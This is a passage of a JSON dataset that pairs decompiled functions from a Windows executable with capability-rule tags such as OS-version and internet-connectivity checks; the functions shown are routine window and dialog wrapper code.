uVar7 = fcn.0042aeb1(puVar9);\n            uVar5 = *(unaff_EBP + 0xc);\n            puVar10 = puVar9;\n            goto code_r0x0042c7b6;\n        }\n        puVar9 = *(unaff_EBP + 0xc);\n        uVar7 = *(unaff_EBP + 8);\ncode_r0x0042c784:\n        (*pcVar1)(uVar7, puVar9);\n        break;\n    case 0x29:\n    case 0x30:\ncode_r0x0042c78e:\n        (*pcVar1)(puVar9);\n        break;\n    case 0x2b:\n    case 0x33:\n        (*pcVar1)(*(unaff_EBP + 0xc), puVar9);\n        goto code_r0x0042c7c4;\n    case 0x2d:\n        uVar7 = iVar11;\n        puVar9 = iVar3;\ncode_r0x0042c76e:\n        uVar8 = (*pcVar1)(uVar7, puVar9);\ncode_r0x0042c819:\n        *(unaff_EBP + -0x10) = uVar8;\n        break;\n    case 0x31:\n        uVar7 = *(unaff_EBP + 0xc) >> 0x10;\n        puVar10 = puVar9;\ncode_r0x0042c79e:\n        uVar5 = *(unaff_EBP + 0xc);\n        goto code_r0x0042c7b6;\n    case 0x32:\n        uVar7 = iVar11;\n        puVar10 = iVar3;\ncode_r0x0042c7b2:\n        uVar5 = *(unaff_EBP + 0xc);\ncode_r0x0042c7b6:\n        (*pcVar1)(uVar5, uVar7, puVar10);\n        break;\n    case 0x34:\n        iVar4 = (*pcVar1)(*(unaff_EBP + 0xc), *(unaff_EBP + 0xc) >> 0x10, puVar9 & 0xffff, puVar9 >> 0x10);\n        *(unaff_EBP + -0x10) = iVar4;\n        goto code_r0x0042c7e8;\n    case 0x41:\n        iVar4 = (*pcVar1)();\n        *(unaff_EBP + -0x10) = iVar4;\n        if (iVar4 != 0) goto code_r0x0042c514;\n    }\ncode_r0x0042c81c:\n    if (*(unaff_EBP + 0x14) != NULL) {\n        **(unaff_EBP + 0x14) = *(unaff_EBP + -0x10);\n    }\n    uVar8 = 1;\ncode_r0x0042c516:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar8;\n}\n",
        "token_count": 4430
    },
    "0042cd7c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042cd7c(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x48) != 0) {\n    // WARNING: Could not recover jumptable at 0x0042cd87. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar1 = (**(**(param_1 + 0x48) + 0x98))();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 116
    },
    "0042cd92": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042cd92(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x48) != 0) {\n    // WARNING: Could not recover jumptable at 0x0042cd9d. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar1 = (**(**(param_1 + 0x48) + 0x54))();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 116
    },
    "0042cda5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042cda5(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x48) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetDlgItem)(*(param_1 + 0x1c), param_2);\n        fcn.0042aeb1(uVar1);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042cdc6. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x48) + 0x74))();\n    return;\n}\n",
        "token_count": 156
    },
    "0042cdc9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042cdc9(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *unaff_retaddr;\n    \n    if (*(param_1 + 0x48) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetDlgItem)(*(param_1 + 0x1c), param_2);\n        *unaff_retaddr = uVar1;\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042cdea. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x48) + 0x70))();\n    return;\n}\n",
        "token_count": 161
    },
    "0042ce20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042ce20(int32_t param_1)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_GetWindowLongA)(*(param_1 + 0x1c), 0xfffffff0);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042ce37. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0x78))();\n    return;\n}\n",
        "token_count": 131
    },
    "0042ce3a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042ce3a(int32_t param_1)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_GetWindowLongA)(*(param_1 + 0x1c), 0xffffffec);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042ce51. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0x7c))();\n    return;\n}\n",
        "token_count": 132
    },
    "0042ce54": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ce54(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x4c) == 0) {\n        fcn.00429a45(*(in_ECX + 0x1c), arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042ce78. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x4c) + 0x80))();\n    return;\n}\n",
        "token_count": 151
    },
    "0042ce7e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ce7e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x4c) == 0) {\n        fcn.00429a5f(*(in_ECX + 0x1c), arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042cea2. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x4c) + 0x84))();\n    return;\n}\n",
        "token_count": 153
    },
    "0042cea8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042cea8(int32_t param_1, uint param_2)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_SetWindowTextA)(*(param_1 + 0x1c), param_2);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042cec3. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0x88))();\n    return;\n}\n",
        "token_count": 134
    },
    "0042cec9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042cec9(int32_t param_1)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(param_1 + 0x1c));\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042cede. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0x90))();\n    return;\n}\n",
        "token_count": 124
    },
    "0042cee4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042cee4(uint X, uint Y, uint nWidth, uint nHeight, uint bRepaint)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_MoveWindow)(*(in_ECX + 0x1c), X, Y, nWidth, nHeight, bRepaint);\n    }\n    else {\n        (**(**(in_ECX + 0x4c) + 0x98))(X, Y, nWidth, nHeight);\n    }\n    return;\n}\n",
        "token_count": 135
    },
    "0042cf22": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042cf22(int32_t param_1, uint param_2)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_ShowWindow)(*(param_1 + 0x1c), param_2);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042cf3d. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0xa0))();\n    return;\n}\n",
        "token_count": 134
    },
    "0042cf43": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042cf43(int32_t param_1)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_IsWindowEnabled)(*(param_1 + 0x1c));\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042cf58. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0xa4))();\n    return;\n}\n",
        "token_count": 124
    },
    "0042cf5e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042cf5e(int32_t param_1, uint param_2)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(*(param_1 + 0x1c), param_2);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042cf79. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0xa8))();\n    return;\n}\n",
        "token_count": 134
    },
    "0042cfa0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0042cfa0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    if (*(arg_8h + 0x4c) != 0) {\n        (**(**(arg_8h + 0x4c) + 0x60))(arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, &arg_20h);\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "0042cfeb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0042cfeb(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    if ((*(param_1 + 0x4c) == 0) && (*(param_2 + 0x48) != 0)) {\n        (**(**(param_2 + 0x48) + 0x9c))(param_1, param_3);\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "0042d010": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042d010(uint *param_1)\n\n{\n    if (param_1[1] != 0) {\n    // WARNING: Could not recover jumptable at 0x0042d01b. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(*param_1[1] + 0x78))();\n        return;\n    }\n    (*_sym.imp.USER32.dll_GetWindowLongA)(*param_1, 0xfffffff0);\n    return;\n}\n",
        "token_count": 115
    },
    "0042d06e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042d06e(int32_t arg_8h, uint X, uint Y, uint cx, uint cy, uint uFlags)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x4c) == 0) {\n        if (arg_8h != 0) {\n            arg_8h = *(arg_8h + 0x1c);\n        }\n        (*_sym.imp.USER32.dll_SetWindowPos)(*(in_ECX + 0x1c), arg_8h, X, Y, cx, cy, uFlags);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0042d0a4. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x4c) + 0x9c))();\n    return;\n}\n",
        "token_count": 202
    },
    "0042d0aa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042d0aa(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if ((param_1 != 0) && (*(param_1 + 0x4c) == 0)) {\n        uVar1 = (*_sym.imp.USER32.dll_GetParent)(*(param_1 + 0x1c));\n        iVar2 = fcn.00427f64(uVar1);\n        if ((iVar2 != 0) && (*(iVar2 + 0x48) != 0)) {\n            (**(**(iVar2 + 0x48) + 0x9c))(param_1, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 160
    },
    "0042d0eb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0042d0eb(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t in_ECX;\n    bool bVar6;\n    code *var_8h;\n    code *var_4h;\n    \n    if (*(in_ECX + 0x48) != 0) {\n        if (arg_ch == 0) {\n            var_8h = 0x411ecf;\n            var_4h = 0x411ac9;\n        }\n        else {\n            var_8h = 0x42d069;\n            var_4h = 0x41300a;\n        }\n        arg_ch = (*var_4h)();\njoined_r0x0042d133:\n        do {\n            if (arg_ch == 0) {\n                return NULL;\n            }\n            ppiVar3 = (*var_8h)(&arg_ch);\n            piVar1 = *ppiVar3;\n            if (arg_8h == NULL) {\n                if ((*piVar1 != 0) && (iVar4 = (*_sym.imp.USER32.dll_GetFocus)(),  *piVar1 == iVar4)) break;\n                if (piVar1[1] == 0) goto joined_r0x0042d133;\n                bVar6 = piVar1[1] == *(*(in_ECX + 0x48) + 0x6c);\n            }\n            else {\n                bVar6 = arg_8h == piVar1;\n            }\n        } while (!bVar6);\n        if (piVar1 != NULL) {\n            if (arg_ch == 0) {\n                arg_ch = (*var_4h)();\n            }\n            do {\n                ppiVar3 = (*var_8h)(&arg_ch);\n                piVar2 = *ppiVar3;\n                uVar5 = fcn.0042d010();\n                if (piVar2 == piVar1) {\n                    return piVar2;\n                }\n                if (((uVar5 & 0x10000) != 0) && ((uVar5 & 0x8000000) == 0)) {\n                    return piVar2;\n                }\n            } while (arg_ch != 0);\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 540
    },
    "0042d1c7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042d1c7(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t in_ECX;\n    uint uVar6;\n    bool bVar7;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    if (*(in_ECX + 0x48) != 0) {\n        var_4h = *(*(in_ECX + 0x48) + 0x44);\ncode_r0x0042d225:\n        do {\n            piVar2 = var_4h;\n            if (var_4h == NULL) {\n                return 0;\n            }\n            ppiVar3 = fcn.0041300e(&var_4h);\n            piVar1 = *ppiVar3;\n            if (arg_8h == NULL) {\n                if ((*piVar1 != 0) && (iVar4 = (*_sym.imp.USER32.dll_GetFocus)(),  *piVar1 == iVar4)) break;\n                if (piVar1[1] == 0) goto code_r0x0042d225;\n                bVar7 = piVar1[1] == *(*(in_ECX + 0x48) + 0x6c);\n            }\n            else {\n                bVar7 = arg_8h == piVar1;\n            }\n        } while (!bVar7);\n        if ((var_4h != NULL) && (piVar1 != NULL)) {\n            bVar7 = false;\n            do {\n                puVar5 = fcn.0041300e(&var_4h);\n                uVar6 = *puVar5;\n                var_ch = fcn.0042d010();\n                if ((!bVar7) && ((var_ch & 0x20000) != 0)) {\n                    bVar7 = true;\n                    arg_8h = piVar2;\n                    fcn.00411acd(&arg_8h);\n                    while (arg_8h != NULL) {\n                        puVar5 = fcn.00411acd();\n                        uVar6 = *puVar5;\n                        var_ch = fcn.0042d010();\n                        if ((var_ch & 0x20000) != 0) {\n                            return uVar6;\n                        }\n                    }\n                }\n                if ((var_ch & 0x8000000) == 0) {\n                    return uVar6;\n                }\n            } while (var_4h != NULL);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 598
    },
    "0042d2c3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042d2c3(int32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t in_ECX;\n    uint uVar6;\n    bool bVar7;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    if (*(in_ECX + 0x48) != 0) {\n        var_4h = *(*(in_ECX + 0x48) + 0x40);\ncode_r0x0042d321:\n        do {\n            piVar2 = var_4h;\n            if (var_4h == NULL) {\n                return 0;\n            }\n            ppiVar3 = fcn.00411acd(&var_4h);\n            piVar1 = *ppiVar3;\n            if (arg_8h == NULL) {\n                if ((*piVar1 != 0) && (iVar4 = (*_sym.imp.USER32.dll_GetFocus)(),  *piVar1 == iVar4)) break;\n                if (piVar1[1] == 0) goto code_r0x0042d321;\n                bVar7 = piVar1[1] == *(*(in_ECX + 0x48) + 0x6c);\n            }\n            else {\n                bVar7 = arg_8h == piVar1;\n            }\n        } while (!bVar7);\n        if ((var_4h != NULL) && (piVar1 != NULL)) {\n            bVar7 = false;\n            do {\n                puVar5 = fcn.00411acd(&var_4h);\n                uVar6 = *puVar5;\n                var_ch = fcn.0042d010();\n                if ((!bVar7) && ((var_ch & 0x20000) != 0)) {\n                    bVar7 = true;\n                    arg_8h = piVar2;\n                    fcn.0041300e(&arg_8h);\n                    while (arg_8h != NULL) {\n                        puVar5 = fcn.0041300e();\n                        uVar6 = *puVar5;\n                        var_ch = fcn.0042d010();\n                        if ((var_ch & 0x20000) != 0) {\n                            return uVar6;\n                        }\n                    }\n                }\n                if ((var_ch & 0x8000000) == 0) {\n                    return uVar6;\n                }\n            } while (var_4h != NULL);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 598
    },
    "0042d3bf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042d3bf(uint *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    int32_t in_ECX;\n    uint *puVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    if (*(in_ECX + 0x48) == 0) {\n        return;\n    }\n    if (arg_8h == NULL) {\n        return;\n    }\n    if ((arg_8h[2] == 0) ||\n       (iVar2 = (*_sym.imp.USER32.dll_SendMessageA)(*arg_8h, 0xf0, 0, 0),  puVar4 = arg_8h,  iVar2 != 1)) {\n        puVar3 = fcn.00427b41(arg_8h, 0);\n        puVar6 = &arg_8h;\n        arg_8h = puVar3;\n        fcn.00411acd(puVar6);\n        do {\n            if (arg_8h == NULL) {\ncode_r0x0042d464:\n                arg_8h = puVar3;\n                fcn.0041300e(&arg_8h, puVar6);\n                while( true ) {\n                    if (arg_8h == NULL) {\n                        return;\n                    }\n                    puVar4 = fcn.0041300e(&arg_8h);\n                    puVar4 = *puVar4;\n                    if ((puVar4[2] != 0) && (iVar2 = (*pcVar1)(*puVar4, 0xf0, 0, 0),  iVar2 == 1)) break;\n                    uVar5 = fcn.0042d010();\n                    if ((uVar5 & 0x20000) != 0) {\n                        return;\n                    }\n                }\n                break;\n            }\n            puVar6 = &arg_8h;\n            puVar4 = fcn.00411acd();\n            puVar4 = *puVar4;\n            uVar5 = fcn.0042d010();\n            if ((uVar5 & 0x20000) != 0) goto code_r0x0042d464;\n        } while ((puVar4[2] == 0) || (iVar2 = (*pcVar1)(*puVar4, 0xf0, 0, 0),  iVar2 != 1));\n    }\n    (*pcVar1)(*puVar4, 0xf1, 0, 0);\n    return;\n}\n",
        "token_count": 594
    },
    "0042d4cf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpString2\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0042d4cf(uint lpString1, uint iMaxLength)\n\n{\n    uint uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint lpString2;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    if (*(extraout_ECX + 0x4c) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetWindowTextA)(*(extraout_ECX + 0x1c), *(unaff_EBP + 8), *(unaff_EBP + 0xc));\n    }\n    else {\n        piVar2 = fcn.00428235();\n        iVar3 = (**(*piVar2 + 0xc))();\n        *(unaff_EBP + -0x10) = iVar3 + 0x10;\n        iVar3 = **(extraout_ECX + 0x4c);\n        *(unaff_EBP + -4) = 0;\n        (**(iVar3 + 0x8c))(unaff_EBP + -0x10);\n        (*_sym.imp.KERNEL32.dll_lstrcpynA)(*(unaff_EBP + 8), *(unaff_EBP + -0x10), *(unaff_EBP + 0xc));\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*(unaff_EBP + 8));\n        fcn.004011b0();\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar1;\n}\n",
        "token_count": 420
    },
    "0042d54f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0042d54f(int32_t param_1, int32_t param_2)\n\n{\n    if (param_2 != 0) {\n        for (; param_1 != 0; param_1 = *(param_1 + 0x10)) {\n            if (param_1 == param_2) {\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 93
    },
    "0042d997": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0042d997(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0041c77c();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CFile.0;\n    *(unaff_EBP + -4) = 0;\n    if ((extraout_ECX[1] != 0xffffffff) && (extraout_ECX[2] != NULL)) {\n        fcn.0042d8f6();\n    }\n    fcn.004011b0();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 198
    },
    "0042ded2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042ded2(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (param_1 != 0) {\n        var_8h = -(*(param_1 + 0x44) != 0);\n        while (var_8h != 0) {\n            fcn.00427fde(&var_8h, &var_ch, &var_4h);\n            puVar1 = *(param_1 + 0x58) + var_4h;\n            *puVar1 = 0;\n            if (*(param_1 + 0x5c) == 2) {\n                puVar1[1] = 0;\n            }\n            (**(param_1 + 0x18))(var_4h);\n        }\n        fcn.00427ee8();\n        fcn.0041ae66();\n    }\n    return;\n}\n",
        "token_count": 222
    },
    "0042df35": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
